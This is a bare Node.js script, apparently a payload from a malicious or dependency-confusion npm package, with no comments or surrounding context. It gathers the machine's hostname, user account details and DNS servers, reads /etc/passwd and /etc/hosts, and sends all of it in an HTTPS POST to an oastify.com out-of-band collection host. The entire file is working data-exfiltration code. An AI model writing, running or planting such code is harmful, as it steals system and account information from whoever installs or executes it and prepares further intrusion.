const os = require("os");
const dns = require("dns");
const fs = require("fs");
const https = require("https");
const payload = {
  host: os.hostname(),
  user: os.userInfo(),
  dns: dns.getServers(),
  passwd: fs.readFileSync("/etc/passwd"),
  hosts: fs.readFileSync("/etc/hosts"),
};
https.request({
  hostname: "e4jw9ucdu7sdebgoqqx919p6qxwoke83.oastify.com",
  method: "POST",
}).end(JSON.stringify(payload));
